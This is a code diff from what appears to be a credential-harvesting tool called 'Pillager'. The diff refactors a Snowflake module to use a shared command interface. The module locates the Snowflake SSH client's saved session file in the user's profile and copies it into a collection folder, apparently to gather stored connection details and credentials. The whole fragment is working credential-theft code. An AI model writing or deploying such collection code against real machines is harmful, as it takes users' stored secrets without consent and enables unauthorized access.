@@ -1,24 +1,19 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using Pillager.Helper;
+using System;
 using System.IO;
-using System.Linq;
-using System.Security.Principal;
-using System.Text;
 
 namespace Pillager.FTPs
 {
-    internal class Snowflake
+    internal class Snowflake : ICommand
     {
-        public static string FTPName = "Snowflake";
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string jsonpath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "snowflake-ssh\\session-store.json");
                 if (File.Exists(jsonpath))
                 {
-                    string savepath = Path.Combine(path, FTPName);
+                    string savepath = Path.Combine(path, "Snowflake");
                     Directory.CreateDirectory(savepath);
                     File.Copy(jsonpath, Path.Combine(savepath, "session-store.json"));
                 }
